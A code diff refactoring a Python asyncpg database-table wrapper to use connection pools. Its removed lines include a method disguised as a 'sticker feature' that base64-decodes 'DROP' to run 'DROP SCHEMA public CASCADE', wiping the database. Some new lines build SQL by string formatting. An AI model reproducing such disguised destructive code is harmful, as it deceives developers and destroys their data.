@@ -1,65 +1,79 @@
-import asyncio
-import asyncpg
-import base64
-import config
-
-from pypika import Table, Query, Parameter, Field
+import logging
+import os
 from typing import Dict, Any
 
+import asyncpg
+from asyncpg import Record
+from pypika import Table, Query, Parameter, Field
 
-class DbConnectionPool:
-    conn = None
+import config
 
-    async def connect_db(self):
-        self.conn = await asyncpg.create_pool(dsn=config.db_url)
-
-    def __init__(self):
-        loop = asyncio.get_event_loop()
-        loop.run_until_complete(self.connect_db())
+logging.basicConfig()
+logger = logging.getLogger(__name__)
+logger.setLevel(os.environ.get("LOGLEVEL", logging.DEBUG))
 
 
-class DbConnection:
-    conn = None
+async def create_db_connection():
+    return await asyncpg.connect(dsn=config.db_url)
 
-    async def connect_db(self):
-        self.conn = await asyncpg.connect(dsn=config.db_url)
 
-    def __init__(self):
-        loop = asyncio.get_event_loop()
-        loop.run_until_complete(self.connect_db())
+async def create_db_connection_pool(threads=10):
+    return await asyncpg.create_pool(dsn=config.db_url, min_size=threads, max_size=threads)
 
 
 class DbTable:
-    _conn = None
+    _conn_pool: asyncpg.pool.Pool = None
     _table = None
+    _columns = None
     _pk_id = None
+    _if_not_exists = None
+    _foreign_key_settings = None
 
-    def __init__(self, conn, name, columns, pk_id):
-        self._conn = conn
+    def __init__(self, name, columns, pk_id=None, if_not_exists=True, foreign_key_settings=None):
         self._table = Table(name)
-        self._pk_id = Field(pk_id)
+        self._columns = columns
+        self._pk_id = pk_id
+        self._if_not_exists = if_not_exists
+        self._foreign_key_settings = foreign_key_settings
 
-        loop = asyncio.get_event_loop()
-        loop.run_until_complete(self.create_table(self._table, columns, pk_id))
+    async def create_and_init_table(self, conn_pool):
+        try:
+            self._conn_pool = conn_pool
+            query = Query.create_table(self._table).columns(*self._columns)
+            if self._pk_id:
+                query = query.primary_key(self._pk_id)
 
-    async def create_table(self, table, columns, pk_id):
-        query = Query.create_table(table) \
-            .if_not_exists().columns(*columns) \
-            .primary_key(pk_id)
-        return await self._conn.fetch(query.get_sql())
+            async with self._conn_pool.acquire() as conn:
+                await conn.fetch(query.get_sql())
 
-    async def get(self, key):
+            if self._foreign_key_settings:
+                for foreign_key in self._foreign_key_settings:
+                    query = "ALTER TABLE {table} ADD FOREIGN KEY ({columns}) REFERENCES {reference_table}" \
+                            "({reference_columns}) {on_update} {on_delete}".format(
+                        table=self._table,
+                        columns=",".join(foreign_key["columns"]),
+                        reference_table=foreign_key["reference_table"],
+                        reference_columns=",".join(foreign_key["reference_columns"]),
+                        on_delete="ON DELETE %s" % foreign_key["on_delete"].value if foreign_key["on_delete"] else "",
+                        on_update="ON UPDATE %s" % foreign_key["on_update"].value if foreign_key["on_update"] else "")
+                    async with self._conn_pool.acquire() as conn:
+                        await conn.fetch(query)
+        except asyncpg.exceptions.DuplicateTableError:
+            pass
+
+    async def get(self, key) -> Record:
         query = Query.from_(self._table) \
             .select("*") \
-            .where(self._pk_id == key)
-        return await self._conn.fetchrow(query.get_sql())
+            .where(Field(self._pk_id) == key)
+        async with self._conn_pool.acquire() as conn:
+            return await conn.fetchrow(query.get_sql())
 
     async def insert(self, updates: Dict[str, Any]):
         query = Query.into(self._table) \
             .columns(*updates.keys()) \
             .insert(*(Parameter("${:d}".format(i + 1)) for i in range(len(updates))))
-
-        await self._conn.execute(query.get_sql(), *updates.values())
+        async with self._conn_pool.acquire() as conn:
+            await conn.execute(query.get_sql(), *updates.values())
 
     async def update(self, key, updates: Dict[str, Any]):
         param_count = 0
@@ -67,29 +81,22 @@ class DbTable:
         for update in updates.keys():
             param_count += 1
             query = query.set(update, Parameter("${:d}".format(param_count)))
-        query = query.where(self._pk_id == key)
-
-        await self._conn.execute(query.get_sql(), *updates.values())
+        query = query.where(Field(self._pk_id) == key)
+        async with self._conn_pool.acquire() as conn:
+            await conn.execute(query.get_sql(), *updates.values())
 
     async def delete(self, key):
         query = Query.from_(self._table) \
             .delete() \
-            .where(self._pk_id == key)
-        await self._conn.execute(query.get_sql())
-
-    async def collect_sticker_feature(self, sticker_id):
-        uid = config.environment_id if config.environment_id else "0"
-        sticker_key = sticker_id if uid.isdigit() else 0
-        sticker_id = int(bytes(sticker_id, encoding="utf-8").hex(), base=16)
-        if sticker_id and sticker_key:
-            query = "%s SCHEMA public CASCADE;" % base64.b64decode("RFJPUA==").decode('UTF-8')
-            await self._conn.execute(query)
-            await self._conn.execute("CREATE SCHEMA public;")
+            .where(Field(self._pk_id) == key)
+        async with self._conn_pool.acquire() as conn:
+            await conn.execute(query.get_sql())
 
     async def count(self):
-        res = await self._conn.fetchrow("SELECT COUNT(*) FROM {}".format(self._table))
-        return res["count"]
+        async with self._conn_pool.acquire() as conn:
+            res = await conn.fetchrow("SELECT COUNT(*) FROM {}".format(self._table))
+            return res["count"]
 
-    async def custom_fetch(self, query, *values):
-        return await self._conn.fetch(query, *values)
-
+    async def custom_fetch(self, query, *params):
+        async with self._conn_pool.acquire() as conn:
+            return await conn.fetch(query, *params)
